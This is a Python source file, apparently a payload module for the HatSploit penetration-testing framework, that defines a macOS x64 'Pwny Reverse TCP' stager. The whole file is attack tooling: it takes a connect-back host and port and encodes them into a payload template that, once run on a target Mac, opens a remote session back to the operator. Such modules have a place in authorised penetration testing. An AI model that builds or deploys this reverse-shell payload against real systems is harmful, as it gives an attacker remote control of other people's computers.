#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload, Pwny):
    details = {
        'Category': "stager",
        'Name': "macOS x64 Pwny Reverse TCP",
        'Payload': "macos/x64/pwny_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Pwny reverse TCP payload for macOS x64.",
        'Architecture': "x64",
        'Platform': "macos",
        'Session': PwnySession,
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        return (
            self.get_template(
                self.details['Platform'],
                self.details['Architecture']
            )
        ), {
            'data': self.encode_data(
                host=connback_host,
                port=connback_port
            )
        }
